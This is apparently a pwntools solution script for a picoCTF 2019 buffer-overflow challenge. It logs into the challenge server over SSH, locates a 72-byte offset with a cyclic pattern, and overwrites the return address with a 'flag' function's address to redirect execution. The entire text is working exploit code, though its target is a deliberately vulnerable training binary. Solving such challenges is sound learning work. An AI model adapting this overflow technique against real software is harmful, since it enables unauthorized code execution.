from pwn import *
import json

LOCAL = False
CYCLIC_FOUND = True
local_bin = './vuln'
elf = ELF('./vuln')

if(LOCAL):
    p = process(local_bin)
else:
    hostname = "2019shell1.picoctf.com"
    dir = '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a'
    with open("/.2019creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    p = s.process('sh')
    p.sendline('./vuln')

# cyclic_find('saaataaauaaavaaawaaaxaaayaaa') which is in RSP
# 72 in RSP
if(not CYCLIC_FOUND):
    payload = cyclic(100)
    print payload
    print(p.recvline().decode())
    p.sendline(payload)
    print(p.recvall().decode())

payload = "A"*72
flag_address = elf.symbols['flag']
#If you look at the dissasembly and the printo out of this variable you see that they are off by 1 for some reason
payload += p64(flag_address+1)
print flag_address

print p.recvline()
p.sendline(payload)
print p.recvline()
